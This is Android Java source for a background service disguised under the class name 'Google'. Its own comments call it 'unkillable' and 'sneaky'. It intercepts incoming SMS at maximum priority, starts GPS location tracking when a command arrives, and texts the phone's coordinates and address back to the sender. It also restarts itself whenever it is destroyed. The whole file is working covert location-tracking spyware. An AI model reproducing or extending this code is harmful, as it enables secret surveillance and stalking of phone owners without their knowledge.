package ws.denger.loc;

import java.util.List;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

/**
 * 杀不死的Service
 * 
 * @author Denger
 * 
 */
public class Google extends Service implements BDLocationListener {
	public final static String ACTION_SEND_LOC_SMS = "ACTION_SEND_LOC_SMS";
	public final static String FLAG_TEL = "FLAG_TEL";
	private String tel;// 坐标发送的手机号码
	private final static String TAG = "Google";
	private LocationClient client;// 度娘屌丝端，用这神器进行各种

	/**
	 * 设置度娘屌丝端的参数
	 */
	private void setOption() {
		LocationClientOption option = new LocationClientOption();
		option.setOpenGps(true); // 1
		option.setCoorType("bd09ll"); // 2
		option.setPriority(LocationClientOption.GpsFirst); // 3 设置优先
		option.setProdName("wsLocation222"); // 4 设置产品线名称
		option.setScanSpan(200);
		client.setLocOption(option);
	}

	/**
	 * 开启定位
	 */
	private void startLocation() {
		Log.d(TAG, "开启定位。。。。");
		client = new LocationClient(this); // 初始化屌丝端
		client.registerLocationListener(this);// 注册监听
		setOption();// 设置参数
		client.start();// 开始
	}

	@Override
	public IBinder onBind(Intent intent) {
		Log.d(TAG, "猥琐的服务--onBind");
		return null;
	}

	@Override
	public void onCreate() {
		Log.d(TAG, "猥琐的服务--onCreate");
		super.onCreate();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		Log.d(TAG, "猥琐的服务--onStart");
		// 再次动态注册短信接收者
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);// 整形最大值
		WSReceiver wsReceiver = new WSReceiver();
		registerReceiver(wsReceiver, localIntentFilter);
		// 如果是符合的ACTION，就启动地理定位并且回复短信
		if (intent.getAction() != null
				&& intent.getAction().equals(ACTION_SEND_LOC_SMS)) {
			tel = intent.getStringExtra(FLAG_TEL);// 获取发送指令的手机号码
			startLocation();// 开启一次性的定位
		}
		super.onStart(intent, startId);
	}

	@Override
	public void onDestroy() {
		Log.d(TAG, "猥琐的服务--onDestroy");
		super.onDestroy();
		Log.d(TAG, "尝试再次启动");
		if (client != null) {
			client.stop();
		}
		startService(new Intent(this, getClass()));
	}

	/**
	 * 发送短信
	 */
	private void sendSMS(String strNo, String strContent) {
		Log.d(TAG, "发送短信咯,内容：" + strContent);
		SmsManager smsManager = SmsManager.getDefault();
		PendingIntent sentIntent = PendingIntent.getBroadcast(this, 0,
				new Intent(), 0);
		// 如果字数超过70,需拆分成多条短信发送
		if (strContent.length() > 70) {
			List<String> msgs = smsManager.divideMessage(strContent);
			for (String msg : msgs) {
				smsManager.sendTextMessage(strNo, null, msg, sentIntent, null);
			}
		} else {
			smsManager.sendTextMessage(strNo, null, strContent, sentIntent,
					null);
		}
	}

	@Override
	public void onReceiveLocation(BDLocation location) {
		StringBuilder sb = new StringBuilder();
		sb.append("时间: ");
		sb.append(location.getTime());
		sb.append("\nerror code: ");
		sb.append(location.getLocType());
		sb.append("\n纬度: ");
		sb.append(location.getLatitude());
		sb.append("\n经度: ");
		sb.append(location.getLongitude());
		sb.append("\n误差径: ");
		sb.append(location.getRadius());
		if (location.getLocType() == BDLocation.TypeGpsLocation) {
			sb.append("\n速度: ");
			sb.append(location.getSpeed());
			sb.append("\n卫星: ");
			sb.append(location.getSatelliteNumber());
		} else if (location.getLocType() == BDLocation.TypeNetWorkLocation) {
			sb.append("\n地址: ");
			sb.append(location.getAddrStr());
		}
		Log.d(TAG, "定位信息---->" + sb.toString());
		if (location.getLocType() >= 162) {// 定位失败，则不回复短信
			return;
		}
		sendSMS(tel, location.getLatitude() + "|*|" + location.getLongitude()
				+ "|*|" + location.getAddrStr());
	}
}
